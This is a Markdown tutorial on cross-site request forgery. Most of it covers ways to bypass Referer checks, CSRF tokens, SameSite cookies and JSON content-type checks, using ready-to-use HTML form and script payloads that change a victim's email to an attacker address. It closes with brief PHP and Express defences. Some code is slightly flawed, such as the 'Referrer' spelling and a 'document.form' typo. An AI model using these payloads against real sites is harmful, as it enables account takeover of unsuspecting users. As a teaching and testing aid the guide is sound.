# CSRF (Cross-Site Request Forgery) Guide

---

## What is Cross-Site Request Forgery (CSRF/XSRF)?

- Imagine you're logged into a website (e.g., banking site). At the same time, you visit a malicious site.
- The malicious site can make requests to the banking site **on your behalf**, without your knowledge.
- **Example Attack:** Change your email, reset password, or transfer funds.
- If the victim is an admin, the attacker could takeover the entire system.

---

## Protections Against CSRF

1. **Referrer Header Check**
2. **CSRF Tokens**
3. **SameSite Cookies**
4. **JSON Format Validation**

---

## Bypassing CSRF Protections

### 1. Referrer Header Bypass

#### Case (1): Remove Referrer
- Some apps don't validate if referrer is missing.

#### Case (2): Subdomain Trick
- If referrer is loosely validated, let's say the target is `account.example.com`, then try setting the Referrer to `account.exampleevil.com`. If it works, buy the domain `exampleevil.com`, create a subdomain named account, and continue your attack.
```http
Referrer: https://evil.com         → Error.
Referrer: https://exampleevil.com  → Success. 
```
- Buy `exampleevil.com` and create `account.exampleevil.com`.

#### Case (3): Using `@` or `/` to Obfuscate
```http
Referrer: https://evil.com/file@https://example.com
```
- Alternate characters: `|`, `/`, `?`, `#`
  - Example:
  	- `Referrer: https://evil.com/file     # Error.`
   - `Referrer: https://evil.com/file?//victim.com     # Success.`

#### HTML PoC with Referrer:
```html
<html>	
<head><meta name="referrer" content="unsafe-url"></head>   <!-- Means that you can send the referrer via HTTP or HTTPS -->
<body>
	<form name="hacker" method="POST" action="https://account.example.com/change_email">
		<input type="hidden" name="email" value="attacker@example.com">   <!-- The inputs are depending on the target variables  -->
	</form>
<!-- Referrer function “pushState”, If we're gonna type # instead of / We just will add # after / like that: /#file -->
	<!-- This function “pushState” takes whatever comes after evil.com -->
	<script>
			history.pushState('','','/file@account.example.com')
			document.form[0].submit();
	</script>
</body>
</html>
```

#### Case (4): Fake Parameter in Referrer
```html
<script>
  history.pushState('', '', '/?param=https://example.com');
  document.forms[0].submit();
</script>
```

#### • Case (5): Remove Referrer with `no-referrer`
```html
<meta name="referrer" content="no-referrer">
```

---

### 2. CSRF Token Bypass Techniques

- Remove the `csrf_token` parameter.
- Use random invalid token (`length ±1`).
- Slightly modify the token (spoof).
- Use token from attacker session.
- Change request method from POST → GET.
- Remove custom header (if token sent via header).
- Guess token (weak randomness).
- Set value to `"null"` or use null bytes.
- Steal token via XSS.
- Intercept and replay token from HTTP traffic.
- Exploit static part of tokens (`abc123XYZ`, `abc456XYZ`).
- Use type juggling (e.g., `0e123456` = `0` in PHP).

---

### 3. SameSite Cookies Bypass

#### • Types:

- **Strict**: Blocked unless same site origin.
- **Lax**: Allows top-level GET requests.
- **None**: Allows all but requires `Secure` (HTTPS).

#### • Detect via response headers:
```
Set-Cookie: session=abc; SameSite=Strict; Secure
```

#### • Strict Bypass:
- Look for open redirect or path traversal in JS.
```js
window.location = blogPath + '/' + postId;
```
Payload:
```html
<form method="POST" action="https://example.com?postId=../../../../change_email">
  <input type="hidden" name='{"test":"x' value='y", "new_email":"attacker@gmail.com"}'/>
</form>
```

#### • Lax Bypass:
- Must use GET.
- Requires user to click.
```html
<script>
  location = "https://example.com/change_email?email=attacker@example.com&_method=POST";
</script>
```

---

### 4. JSON Format Bypass

#### • Case (1): Change Content-Type
- From: `application/json`
- To: `application/x-www-form-urlencoded` or `text/plain`

```html
<form method="POST" action="https://example.com/phone.json" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name='{"test":"x' value='y", "new_email":"attacker@gmail.com"}'/>
</form>
```

#### • Case (2): Only change `Content-Type`, keep JSON format
```html
<form method="POST" action="https://example.com/phone.json" enctype="text/plain">
  <input type="hidden" name='{"test":"x' value='y", "new_email":"attacker@gmail.com"}'/>
</form>
```

#### • Case (3): Change Method from PUT/PATCH → POST
- Replace JSON with URL-encoded or text body.

```http
PATCH → POST
Content-Type: application/json → text/plain
```

---

## ▪ Preventing CSRF

### • PHP:
```php
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("Invalid CSRF Token");
}
```

### • Express.js:
```js
app.use(session({
  secret: "your_secret",
  resave: false,
  saveUninitialized: true,
  cookie: { sameSite: "Strict", secure: true }
}));
```
